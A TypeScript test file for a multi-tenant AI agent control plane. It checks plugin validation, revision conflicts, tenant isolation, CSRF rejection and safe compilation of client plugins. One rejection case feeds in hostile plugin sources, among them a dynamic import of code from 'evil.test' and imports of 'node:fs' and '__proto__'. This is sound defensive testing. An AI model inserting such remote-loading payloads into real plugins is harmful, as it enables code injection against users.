import assert from "node:assert/strict";
import { test } from "node:test";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Response, type V4FetchHandler } from "miniflare";
import {
  createRuntime,
  tenantId,
  url,
  sessionPath,
} from "./helpers/miniflare.ts";
import type {
  AgentRevision,
  ClientPlugin,
  TenantState,
} from "../packages/control-plane/src/contracts.ts";

const base = `/v1/tenants/${tenantId("alpha")}`;
function event(type: string, value: Record<string, unknown> = {}): string {
  return `event: ${type}\ndata: ${JSON.stringify({ type, ...value })}\n\n`;
}
function completion(tool?: { name: string; input: unknown }): Response {
  let value = event("message_start", {
    message: { usage: { input_tokens: 10, output_tokens: 0 } },
  });
  value += event("content_block_start", {
    index: 0,
    content_block: tool
      ? { type: "tool_use", id: "call-" + crypto.randomUUID(), ...tool }
      : { type: "text", text: "plugin complete" },
  });
  value += event("content_block_stop", { index: 0 });
  value +=
    event("message_delta", {
      delta: { stop_reason: tool ? "tool_use" : "end_turn" },
      usage: { output_tokens: 4 },
    }) + event("message_stop");
  return new Response(value, {
    headers: { "content-type": "text/event-stream" },
  });
}

test("tenant control plane publishes native plugin plans, freezes sessions and persists revisions", async () => {
  const directory = await mkdtemp(join(tmpdir(), "weft-control-"));
  const requests: {
    tools: { name: string }[];
    system: unknown;
    messages: unknown;
  }[] = [];
  const model: { bindings: Record<string, string>; outbound: V4FetchHandler } =
    {
      bindings: {
        MODEL_BACKEND: "deepseek",
        DEEPSEEK_API_KEY: "test-secret",
        DEEPSEEK_BASE_URL: "https://model.test/anthropic",
      },
      outbound: async (request) => {
        requests.push((await request.json()) as (typeof requests)[number]);
        if (requests.length === 1)
          return completion({
            name: "todo_write",
            input: {
              todos: [{ content: "Use a real skill", status: "in_progress" }],
            },
          });
        if (requests.length === 2)
          return completion({ name: "skill", input: { name: "greeting" } });
        return completion();
      },
    };
  let runtime = createRuntime(directory, model);
  const request = (path: string, body?: unknown) =>
    runtime.dispatchFetch(
      url("alpha", base + path),
      body === undefined
        ? {}
        : {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify(body),
          },
    );
  try {
    const state = (await (await request("/state")).json()) as TenantState;
    const initial = state.agents.find(profile => profile.spec.id === 'default')!;
    assert.equal(initial.revision, 1);
    assert.equal(initial.spec.allowClientPlugins, false);
    const catalog = (await (await request("/plugins")).json()) as {
      plugins: {
        id: string;
        schema: { uid: number; refs: unknown };
        fields: unknown[];
      }[];
    };
    assert.equal(catalog.plugins.length, 6);
    assert.ok(
      catalog.plugins.every(
        (plugin) => plugin.schema.refs && Array.isArray(plugin.fields),
      ),
    );
    for (const plugins of [
      [{ id: "not-installed", config: {} }],
      [{ id: "time-context", config: { timeZone: "not/a/zone" } }],
      [
        {
          id: "tool-todo",
          config: { allowParallelInProgress: true, unknown: true },
        },
      ],
      [{ id: "repeat-tool-reminder", config: { thresholds: [1] } }],
    ]) {
      assert.equal(
        (
          await request("/agents", {
            spec: { ...initial.spec, plugins },
            expectedRevision: 1,
          })
        ).status,
        400,
      );
    }
    const write = await runtime.dispatchFetch(
      url("alpha", `${base}/workspaces/default/files`),
      {
        method: "PUT",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          path: "/workspace/.agents/skills/greeting/SKILL.md",
          content:
            "---\nname: greeting\ndescription: Use for greeting tests.\n---\nSay GREETING_FROM_NATIVE_SKILL.",
          expectedVersion: null,
        }),
      },
    );
    assert.equal(write.status, 200, await write.clone().text());
    const first = await request("/sessions/native/messages", {
      text: "use todo and greeting skill",
      agent: { id: "default", revision: 1 },
    });
    assert.equal(first.status, 200, await first.clone().text());
    const body = await first.text();
    assert.match(body, /todo\/write/);
    assert.match(body, /GREETING_FROM_NATIVE_SKILL/);
    const savedFirst = await request("/sessions/native/events");
    assert.equal(savedFirst.status, 200, await savedFirst.clone().text());
    assert.match(await savedFirst.text(), /todo\/write/);
    assert.ok(requests[0]!.tools.some((tool) => tool.name === "todo_write"));
    assert.ok(requests[0]!.tools.some((tool) => tool.name === "skill"));
    assert.match(JSON.stringify(requests[0]!.messages), /greeting/);
    assert.match(
      JSON.stringify(requests[2]!.messages),
      /GREETING_FROM_NATIVE_SKILL/,
    );

    const spec = {
      ...initial.spec,
      persona: "New immutable persona",
      plugins: [
        {
          id: "time-context",
          config: { timeZone: "Asia/Shanghai", refreshIntervalMs: 0 },
        },
        { id: "repeat-tool-reminder", config: {} },
      ],
    };
    const publications = await Promise.all([
      request("/agents", { spec, expectedRevision: 1 }),
      request("/agents", { spec, expectedRevision: 1 }),
    ]);
    assert.deepEqual(
      publications.map((value) => value.status).sort(),
      [200, 409],
    );
    assert.equal(
      (
        await request("/sessions/native/messages", {
          text: "continue without overriding the binding",
        })
      ).status,
      200,
    );
    assert.ok(
      requests.at(-1)!.tools.some((tool) => tool.name === "todo_write"),
    );
    assert.doesNotMatch(
      JSON.stringify(requests.at(-1)!.system),
      /New immutable persona/,
    );
    assert.equal(
      (
        await request("/sessions/native/messages", {
          text: "invalid switch",
          agent: { id: "default", revision: 2 },
        })
      ).status,
      409,
    );
    assert.equal(
      (
        await request("/sessions/new-native/messages", {
          text: "new version",
          agent: { id: "default", revision: 2 },
        })
      ).status,
      200,
    );
    assert.ok(
      !requests.at(-1)!.tools.some((tool) => tool.name === "todo_write"),
    );
    assert.match(
      JSON.stringify(requests.at(-1)!.system),
      /New immutable persona/,
    );
    const events = await (await request("/sessions/new-native/events")).text();
    assert.match(events, /time-context/);
    assert.equal(
      ((await (await request("/state")).json()) as TenantState).sessions.length,
      2,
    );
    assert.equal((await request("/agents/default?revision=1")).status, 200);
    assert.equal(
      (await runtime.dispatchFetch(url("beta", base + "/state"))).status,
      403,
    );
    const csrf = await runtime.dispatchFetch(url("alpha", base + "/agents"), {
      method: "POST",
      headers: {
        "content-type": "application/json",
        origin: "https://elsewhere.test",
      },
      body: JSON.stringify({ spec, expectedRevision: 2 }),
    });
    assert.equal(csrf.status, 403);
    await runtime.dispose();
    runtime = createRuntime(directory, model);
    const recovered = (await (await request("/state")).json()) as TenantState;
    assert.equal(recovered.agents.find(profile => profile.spec.id === 'default')!.revision, 2);
    assert.equal(recovered.sessions.length, 2);
    assert.equal(
      (
        await request("/sessions/native/messages", {
          text: "continue after restart",
        })
      ).status,
      200,
    );
    assert.ok(
      requests.at(-1)!.tools.some((tool) => tool.name === "todo_write"),
    );
  } finally {
    await runtime.dispose();
    await rm(directory, { recursive: true, force: true });
  }
});

test("client plugin source is compiled without evaluation, gated by exact revision and tenant Access", async () => {
  const runtime = createRuntime();
  const publish = (source: string) =>
    runtime.dispatchFetch(url("alpha", base + "/client-plugins"), {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ id: "hello", name: "Hello", source }),
    });
  try {
    const html = await runtime.dispatchFetch(url("alpha", "/"));
    assert.equal(html.status, 200);
    assert.match(html.headers.get("content-type")!, /text\/html/);
    assert.match(
      html.headers.get("content-security-policy")!,
      /script-src 'self'/,
    );
    assert.doesNotMatch(
      html.headers.get("content-security-policy")!,
      /unsafe-eval/,
    );
    assert.equal(
      (await runtime.dispatchFetch(url("anonymous", "/assets/app.js"))).status,
      401,
    );
    assert.equal(
      (
        await runtime.dispatchFetch(
          url("alpha", "/assets/ui-runtime/cordis.js"),
        )
      ).status,
      200,
    );
    for (const source of [
      "import fs from 'node:fs'; export function apply() {}",
      "import x from '__proto__'; export function apply() {}",
      "export const p=import('https://evil.test/plugin.js');",
      "this is invalid TSX !",
    ])
      assert.equal((await publish(source)).status, 400);
    const source =
      "import React from 'react'; import Schema from '@deepseek-ai/schemastery'; throw new Error('must not run on server'); export const Config=Schema.object({title:Schema.string()}); export function apply(ctx: unknown) { return <strong>safe source</strong> }";
    const response = await publish(source);
    assert.equal(response.status, 200, await response.clone().text());
    const plugin = (await response.json()) as ClientPlugin;
    const path = `/client-plugins/${plugin.revision}/module.js`;
    assert.equal(
      (await runtime.dispatchFetch(url("alpha", base + path))).status,
      404,
    );
    const enable = (revision: string, enabled: boolean) =>
      runtime.dispatchFetch(
        url("alpha", base + "/client-plugins/hello/enable"),
        {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ revision, enabled }),
        },
      );
    assert.equal((await enable(crypto.randomUUID(), true)).status, 409);
    assert.equal((await enable(plugin.revision, true)).status, 200);
    const module = await runtime.dispatchFetch(url("alpha", base + path));
    assert.match(module.headers.get("content-type")!, /javascript/);
    const compiled = await module.text();
    assert.match(compiled, /\/assets\/ui-runtime\/react\.js/);
    assert.doesNotMatch(compiled, /ctx: unknown/);
    assert.equal(
      (await runtime.dispatchFetch(url("beta", base + path))).status,
      403,
    );
    const next = (await (
      await publish("export function apply() {}")
    ).json()) as ClientPlugin;
    assert.notEqual(next.revision, plugin.revision);
    assert.equal(
      (await runtime.dispatchFetch(url("alpha", base + path))).status,
      404,
    );
    assert.equal((await enable(plugin.revision, false)).status, 409);
    assert.equal((await enable(next.revision, true)).status, 200);
    assert.equal((await enable(next.revision, false)).status, 200);
    assert.equal(
      (
        await runtime.dispatchFetch(
          url("alpha", `${base}/client-plugins/${next.revision}/module.js`),
        )
      ).status,
      404,
    );
  } finally {
    await runtime.dispose();
  }
});
